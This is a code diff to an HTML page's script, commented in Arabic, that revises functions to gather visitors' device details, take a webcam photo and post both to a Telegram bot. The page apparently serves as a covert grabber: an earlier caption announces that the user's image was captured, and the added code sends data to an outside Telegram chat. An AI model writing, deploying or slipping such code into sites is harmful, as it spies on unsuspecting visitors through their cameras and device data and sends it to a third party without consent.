@@ -142,84 +142,75 @@
         const platform = navigator.platform;
         const browserInfo = navigator.userAgent;
         const language = navigator.language;
-        const memory = navigator.deviceMemory || 4; // قيمة افتراضية إذا لم تكن موجودة
-        const cpuCores = navigator.hardwareConcurrency || 4; // عدد الأنوية الافتراضي
+        const memory = (navigator.deviceMemory || 4).toFixed(2); // افتراضياً 4 جيجا
+        const cpuCores = navigator.hardwareConcurrency;
         const screenResolution = `${window.screen.width}x${window.screen.height}`;
-        
-        return { platform, browserInfo, language, memory, cpuCores, screenResolution };
+        return {
+            platform,
+            browserInfo,
+            language,
+            memory,
+            cpuCores,
+            screenResolution
+        };
     }
 
     // دالة لالتقاط صورة من كاميرا الويب
     async function captureImage() {
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
-
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
             video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
             video.play();
-
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    resolve(canvas.toDataURL('image/jpeg'));
-                }, 3000); // أخذ صورة بعد 3 ثواني
-            });
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(track => track.stop());
+            return imageData;
         } catch (error) {
-            console.error('Error accessing webcam:', error);
+            console.error('Error capturing image:', error);
             return null;
         }
     }
 
-    // دالة لإرسال البيانات إلى Telegram
+    // دالة لإرسال النص إلى Telegram bot
     async function sendToTelegram(message) {
-        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        const response = await fetch(telegramApiUrl, {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json',
+            },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 text: message,
                 parse_mode: 'Markdown'
             })
         });
-
-        const data = await response.json();
-        if (!data.ok) {
-            console.error('Failed to send message to Telegram:', data);
-        } else {
-            console.log('Message sent successfully');
+        if (!response.ok) {
+            console.error('Error sending message to Telegram');
         }
     }
 
-    // دالة لإرسال الصورة إلى Telegram
+    // دالة لإرسال الصورة إلى Telegram bot
     async function sendImageToTelegram(imageData) {
-        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const response = await fetch(telegramApiUrl, {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', imageData);
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                photo: imageData,
-                caption: "📷 *تم التقاط صورة المستخدم*"
-            })
+            body: formData,
         });
 
-        const data = await response.json();
-        if (!data.ok) {
-            console.error('Failed to send photo to Telegram:', data);
-        } else {
-            console.log('Photo sent successfully');
+        if (!response.ok) {
+            console.error('Error sending image to Telegram');
         }
     }
 </script>
 
-
-
-
 </body>
-
 </html>
